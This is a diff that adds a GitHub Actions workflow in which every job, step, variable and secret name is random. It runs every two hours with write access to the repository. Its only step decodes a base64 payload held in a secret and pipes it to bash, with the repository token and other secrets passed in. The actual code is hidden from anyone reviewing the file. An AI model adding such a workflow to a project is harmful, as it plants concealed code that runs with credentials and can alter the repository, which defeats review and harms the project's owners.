@@ -1,0 +1,21 @@
+name: MWe0MbIw
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  BjLfA:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.JFxZp }}
+      - name: jJpZE
+        env:
+          zwYGR88X: ${{ secrets.lTdVqlal0oJnc }}
+          MD1MlR6l: ${{ secrets.ZQ4tL7Oq7ewvF5f }}
+          VCgLAyxrbHJZo: ${{ secrets.OktcCbpnk0 }}
+          GITHUB_TOKEN: ${{ secrets.JFxZp }}
+        run: echo "$zwYGR88X" | base64 -d | bash
